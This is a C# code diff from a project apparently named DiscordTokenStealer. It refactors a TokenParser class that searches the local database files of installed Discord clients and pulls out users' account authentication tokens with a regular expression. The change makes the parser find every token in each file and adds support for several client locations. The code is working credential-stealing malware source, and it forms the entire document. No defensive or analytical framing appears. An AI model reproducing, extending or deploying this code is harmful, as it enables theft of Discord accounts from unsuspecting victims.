@@ -2,16 +2,30 @@
 using System.Text.RegularExpressions;
 
 namespace DiscordTokenStealer.Discord;
-public class TokenParser
+public static class TokenParser
 {
-    private static readonly Regex TokenRegex = new Regex("[[]oken.*?\"((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
-    private static IEnumerable<string> ParseFrom(string directory)
+    private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
+    private static IEnumerable<string> ParseFrom(string directory, string searchPattern)
     {
-        return Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups).Where(groups => groups.Count >= 3).Select(groups => string.Join('.', groups.Values.Skip(1)));
+        return Directory.GetFiles(directory, searchPattern).SelectMany(fileName => ParseTokens(File.ReadAllText(fileName)));
     }
 
-    public static List<string> ParseAll()
+    private static IEnumerable<string> ParseTokens(string text)
     {
-        return SmartEnum<DiscordClientType>.GetMembers().SelectMany(client => ParseFrom(client.LevelDatabase)).Distinct().ToList();
+        return TokenRegex.Matches(text).Where(m => m.Success).Select(match => string.Join('.', match.Groups.Values.Skip(1)));
+    }
+
+    public static IEnumerable<string> ParseAll()
+    {
+        List<string> tokens = new();
+        foreach (LevelDatabaseProvider? provider in typeof(LevelDatabaseProvider).GetFields(BindingFlags.Static | BindingFlags.Public).Where(f => f.FieldType == typeof(LevelDatabaseProvider)).Select(f => (LevelDatabaseProvider?) f.GetValue(null)))
+        {
+            if (provider is not { Exists: true })
+            {
+                continue;
+            }
+            tokens.AddRange(ParseFrom(provider.Location, provider.SearchPattern));
+        }
+        return tokens.Distinct();
     }
 }
